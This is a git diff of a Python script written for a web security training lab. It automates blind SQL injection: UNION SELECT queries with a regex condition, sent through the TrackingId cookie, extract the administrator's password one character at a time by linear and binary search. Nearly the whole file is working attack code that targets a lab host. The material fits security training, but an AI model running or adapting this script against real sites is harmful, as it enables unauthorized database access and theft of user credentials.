@@ -9,6 +9,7 @@ import urllib.parse
 import time
 import string
 
+
 # Functions:
 # Step 4: Inital Program:
 def try_query(query):
@@ -27,8 +28,9 @@ def try_query(query):
 # a letter that is being tested to see if it exists inside of the password.
 def test_string(url, prefix, letter):
     #query is what is going to be passed in as a regex argument along with the cookie.,
-    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '{prefix}{letter}'--"  #removed the ^ from the ^{prefix} , since prefix has that already
-    print(f'\nTesting: {prefix}{letter}')
+    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{prefix}{letter}'--"
+    print(f'\nTesting: ^{prefix}{letter}')
+    print(f"Query: {query}")
     mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
 
     # Now to test it:
@@ -36,25 +38,47 @@ def test_string(url, prefix, letter):
     soup = BeautifulSoup(resp.text, 'html.parser')
 
     if soup.find('div', text='Welcome back!'):
-        print(f'Found Character {letter}')
+        if len(letter) == 1:
+            print(f'Found Character {letter}')
         return True
     else:
         return False
 
+# Step 8: Linear Search:
+def linear_search():
+    start_alpha = string.ascii_lowercase + string.digits
+    prefix = ''
+    begin_time = time.perf_counter()
+    while True:
+        # Test if the current prefix IS the exact password.
+        if test_string(url, prefix, '$'):
+            break
+        # Otherwise, go through the letter list
+        for letter in start_alpha:
+            check = test_string(url, prefix, letter)
+            if check:
+                prefix += letter
+                break
+    print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    return prefix
+
 
 def recursive_search(url, administrator_prefix, charset, mid):
-    if (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
-        administrator_prefix += recursive_search(url, administrator_prefix, charset[:mid], len(charset[:mid])//2)
-    elif (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
-        administrator_prefix += recursive_search(url, administrator_prefix, charset[mid:], len(charset[mid:])//2)
+    # print(len(charset[:mid]))
+    if (len(charset[:mid]) // 2) >= 1 and try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]'--"""):
+        #print(f"\nLeft side:\ncharset: {[charset[:mid]]}\nmid: {mid}\n")
+        administrator_prefix = str(recursive_search(url, administrator_prefix, charset[:mid], len(charset[:mid])//2))
+    elif (len(charset[mid:]) // 2) >= 1 and try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]'--"""):
+        #print(f"\nRight side:\ncharset: {charset}\nmid: {mid}\n")
+        administrator_prefix = str(recursive_search(url, administrator_prefix, charset[mid:], len(charset[mid:])//2))
     
-    if (len(charset[:mid])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
-        administrator_prefix += charset[:mid]
-        print(f"administrator_prefix: {administrator_prefix}")
+    if (len(charset[:mid])//2 <= 1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}{charset[:mid]}'--""")):
+        administrator_prefix +=  str(charset[:mid])
         return administrator_prefix
-    if (len(charset[mid:])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
-        administrator_prefix += charset[mid:]
-        print(f"administrator_prefix: {administrator_prefix}")
+    elif (len(charset[mid:])//2 <= 1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}{charset[mid:]}'--""")):
+        administrator_prefix += str(charset[mid:])
+        return administrator_prefix
+    else:
         return administrator_prefix
 
 
@@ -62,28 +86,25 @@ def binary_search(url):
     administrator_prefix = ''
     charset = string.ascii_lowercase + string.digits
     mid = len(charset) // 2
-    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[:mid]}]' --"""))
-    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[mid:]}]' --"""))
     while True:
-        administrator_prefix += recursive_search(url, administrator_prefix, charset, mid)
+        administrator_prefix = recursive_search(url, administrator_prefix, charset, mid)
+        print(f"Admin password: {administrator_prefix}")
         if test_string(url, administrator_prefix, '$'):
             return administrator_prefix
-
-
-
-
 
 
 
 # To clean things up
 if __name__ == "__main__":
     #site = sys.argv[1]
-    site = 'https://ac4d1f6f1f26c6de806067290069006b.web-security-academy.net/'
+    site = 'https://ac1f1fc01e512a2d805d2292000f004f.web-security-academy.net/'
     if 'https://' in site:
         site = site.rstrip('/').lstrip('https://')
 
     url = f'https://{site}/'
 
+    # print(linear_search())
+    
     # Step #11: Binary Search:
     admin_password = binary_search(url)
     print(f"Final password is: {admin_password}\n")
